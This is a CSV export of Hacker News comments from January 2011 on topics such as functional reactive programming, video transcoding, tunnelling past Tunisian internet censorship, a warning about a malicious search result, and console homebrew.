ID,Type,Story,Parent,Points,Comments,Author,Title,URL,Content,Created
2079309,comment,2079210,2079282,0,0,timrobinson,,,"Functional reactive programming provides a decent abstraction for functional UIs: <a href=""http://stackoverflow.com/questions/1028250/what-is-functional-reactive-programming"" rel=""nofollow"">http://stackoverflow.com/questions/1028250/what-is-functiona...</a><p>My understanding is that FRP represents the state of the program as a function of a stream of events. Each time a new event comes in, information about the event is used to create a new state based on the current one. Ultimately the global state of the program gets mutated, but this fact can be abstracted away; program logic looks like: λ event oldState -> newState",1294401594
2079308,comment,2077844,2078627,0,0,JonnieCache,,,"Worst of all, when transcoding you are needlessly discarding data and therefore picture quality. It you don't have to, you shouldn't.",1294401541
2079307,comment,2079223,2079249,0,0,iuguy,,,"The simple answer for small repressive governments is to block the HTTPS login form so you have to fall back to HTTP. ATI has complete control of all Internet access in Tunisia. You're just not going to get through them unless you can find a way through.<p>In some countries I work in we routinely come across censorship and all kinds of dodgy goings on, so we have a variety of tunnelling methods (VPN, SSH, ICMPTX, DNSTX, Tor and a few non-public tunnelling options). For the most part as long as you can terminate a connection in somewhere you're fairly comfortable with you're better off.<p>Also don't make the mistake of feeling that the US, UK or EU are automatically comfortable options. It all depends what you're doing with the data. A little common sense goes a long way.",1294401501
2079306,comment,2073737,2074352,0,0,sdizdar,,,"I think the very first thing is to try to prevent malicious sites to be on the first page. 
For example, try searching for ""lawsuit employment rejection"". 
The very first hit is: jaysgrafx.com/char-tritan-energy-power-com-employment-san-marcos-tx-job/. Do not click on it (it forwards you 84bf4ada.logout3.cz.cc/).",1294401500
2079305,comment,2079218,2079277,0,0,Luc,,,"Fix dye to wool, or during tanning to loosen fat tissue and hair from animal skin.<p>And once you take the piss out, they are less full of themselves...",1294401478
2079304,comment,2079261,2079286,0,0,vasi,,,"This isn't possible in the generic case. Once the OS loads, its kernel will look for a root filesystem somewhere, and the ISO isn't one of the usual places it will look (ie: a partition).",1294401441
2079303,story,,,1,0,AlfredTwo,"To Teach With an IDE or not to teach with an IDE",http://blogs.msdn.com/b/alfredth/archive/2011/01/07/to-ide-or-not-to-ide.aspx,,1294401436
2079301,comment,2079121,2079222,0,0,thorin,,,"Yes, I can see it going somewhere now with the growth of mobile devices. I love the old text adventures. Retrotastic.",1294401391
2079300,comment,2077844,2079087,0,0,iheartmemcache,,,"You're making a pretty egregious (and insulting) mistake by conflating pirates (i.e., those just want to steal games) with homebrewers (really intelligent electrical engineers, mathematicians with PhDs, tec).<p>That's not to say that those who crack things (essentially ""pirates) like SecureROM and SafeDisk aren't intelligent, but the fail0verflow is on a whole 'nother level.",1294401372
2079299,comment,2079218,2079296,0,0,JonnieCache,,,"It looks like they had fun making it. I plan to do a version for HN one day but generated using a Markov Model, with karma as the hidden variable. Just one of the many items on The List :)",1294401329
2079297,comment,2078077,2078470,0,0,getonit,,,"To reflect the fact that people didn't believe her, I'd guess.",1294401268
2079296,comment,2079218,2079218,0,0,paraschopra,,,"This guy should simply stop using Quora if he is pissed off by endless stream of discussions. Why go great lengths to mock it? I don't see any point in this effort.",1294401216
